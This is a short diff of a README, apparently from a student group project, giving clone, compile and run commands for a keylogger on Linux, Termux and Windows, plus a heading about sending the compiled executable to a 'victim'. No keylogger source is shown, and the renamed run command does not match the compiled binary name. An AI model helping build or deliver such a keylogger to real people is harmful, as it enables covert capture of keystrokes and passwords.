@@ -33,15 +33,15 @@ Nhóm 1 - Thành viên:
 
 # Installation on Linux and Termux
 ```
-git clone https://github.com/4anonz/KeyScan.git
-cd KeyScan
-g++ main.cpp -o keyscan
-./keyscan
+git clone https://github.com/BluePhoenixxx/PTITHCM_TTCS_NHOM1.git
+cd PTITHCM_TTCS_NHOM1
+g++ main.cpp -o keylogger
+./PTITHCM_TTCS_NHOM1
 ```
 # Installation on Windows
 ```
-g++ main.cpp -o keyscan.exe -lws2_32
-.\keyscan.exe
+g++ main.cpp -o keylogger.exe -lws2_32
+.\keylogger.exe
 ```
 # Sending the exe file to the victim
 If you're working on Linux you need to install mingw for compiling C++ windows programs on linux.
